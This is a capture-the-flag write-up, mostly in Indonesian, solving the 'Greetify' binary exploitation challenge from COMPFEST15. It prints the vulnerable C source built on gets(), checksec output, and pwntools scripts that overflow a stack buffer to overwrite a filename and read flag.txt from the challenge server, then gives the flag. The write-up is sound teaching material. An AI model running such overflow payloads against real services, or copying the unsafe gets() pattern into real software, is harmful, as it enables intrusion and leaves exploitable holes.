## Challenge Name: Greetify
>Category: Binary Exploitation

>Points: 147

>Solves: 47

### Challenge Description: 

Because I'm feeling lonely, I made an application to greet me. But I'm sure that I'm not the only one who's lonely, so I made it in a way that it can greet anyone. However, I'm not sure if it's safe to use. Can you help me check it?

Flag is at flag.txt

```nc 34.101.174.85 10001```

Author: NeoZap


Artifact Files:
* [chall](https://ctf.compfest.id/files/805a61610221c3483b8a3abc9f2756a0/chall?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6OH0.ZNIVGA.G0sg6-XJJftr04o086hJMFExRgk)
* [chall.c](https://ctf.compfest.id/files/54de91b912b6f26857e13b63fd223ff1/chall.c?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6OX0.ZNIVGA.tBYoAqotR6pu1usMytokkGT6xC8)

### Approach

**1. Analyze the file?**

Unduh file artifak yang ada. Setelah itu, mari kita analisis. Pertama kita lihat isi ```chall.c```.
```
#include <stdio.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);

    char file_to_open[] = "hello_there.txt";

    puts("Welcome to Greetify! ^^");
    puts("We are here to greet you, hope you enjoy our company! :D");
    printf("First off, what is your name? ");

    char name[88];
    gets(name);

    FILE *fptr = fopen((char *)file_to_open, "r");
    if (fptr == NULL) {
        printf("File %s does not exist! >:(", file_to_open);
        return 69;
    }

    char* hello;
    fscanf(fptr, "%s", hello);
    puts("");
    printf("%s %s\n", hello, name);

    puts("Fin. Thank you for using Greetify! ^^");
    fclose(fptr);
}
```
Jika kita analisis, kode ini memiliki celah keamanan yakni pada ```gets()```. Fungsi ```gets()``` membaca input sampai bertemu newline (\n). Hal ini membuat program ini rentan terkena buffer overflow.

Sebelum menyerang, kita lihat apa proteksi yang dimiliki oleh file binary ```chall```. Pemeriksaan bisa dilakukan dengan program ```checksec``` yang bisa diunduh dengan command:
```
sudo apt install checksec
```
Untuk memerika proteksi, gunakan command berikut:
```
checksec --file=chall
```
Diperoleh:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   72) Symbols	  No	0		2		chall

```
File ini tidak ada stack canary, namun ada NX (non-executable) dan PIE (posisi symbol bisa berubah-ubah tiap dieksekusi). 

**2. Flood the Buffer and Get the flag**

Karena tidak ada canary, kita bisa coba jebol buffernya dengan script berikut. Karena file binary di local dan server sama, kita coba tembak saja ke server mumpung gak ada poin minus kalau salah tebak.
```
import pwn

# hubungkan ke server
r = pwn.remote('34.101.174.85', 10001)

# terima 2 pesan awal
print(r.recvline())
print(r.recvline())

# Tunggu promptnya muncul
r.recvuntil(b"First off, what is your name? ")

# Kirim payload untuk tes buffer overflow
r.sendline(b"A" * 100)

# Lihat responsenya
response = r.recvall()
print(response.decode())
```
Coba kita jalankan scriptnya.
```
[+] Opening connection to 34.101.174.85 on port 10001: Done
b'Welcome to Greetify! ^^\n'
b'We are here to greet you, hope you enjoy our company! :D\n'
[+] Receiving all data: Done (29B)
[*] Closed connection to 34.101.174.85 port 10001
File AAAA does not exist! >:(
```
Nah sip buffernya bisa dijebol ternyata. Karena di line terakhir tertulis nama filenya AAAA, berarti posisi buffer nama file ada sekitar 96 bytes dari awal buffer input nama.

Sekarang apa payload yang tepat??

Biasanya kalo soal ctf macam ini, flagnya ada di file bernama ```flag.txt```. Coba kita jadikan itu payload.
```
import pwn

# hubungkan ke server
r = pwn.remote('34.101.174.85', 10001)

# terima 2 pesan awal
print(r.recvline())
print(r.recvline())

# Tunggu promptnya muncul
r.recvuntil(b"First off, what is your name? ")

# Kirim payload untuk mendapatkan file
r.sendline(b"A" * 96 + b"flag.txt")

# Lihat responsenya
response = r.recvall()
print(response.decode())
```
Coba kita jalankan.
```
[+] Opening connection to 34.101.174.85 on port 10001: Done
b'Welcome to Greetify! ^^\n'
b'We are here to greet you, hope you enjoy our company! :D\n'
[+] Receiving all data: Done (212B)
[*] Closed connection to 34.101.174.85 port 10001

COMPFEST15{buffernya_bocor_mz__jadi_ngebuka_file_lain_deh___h3hEh3} AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag.txt
Fin. Thank you for using Greetify! ^^
```
Alhamdulillah dapat flagnya. Flagnya adalah:
```
COMPFEST15{buffernya_bocor_mz__jadi_ngebuka_file_lain_deh___h3hEh3}
```
### Reflections

Permulaan menarik untuk belajar buffer overflow dan ```pwntools```.

---
[Back to home](../Readme.md)
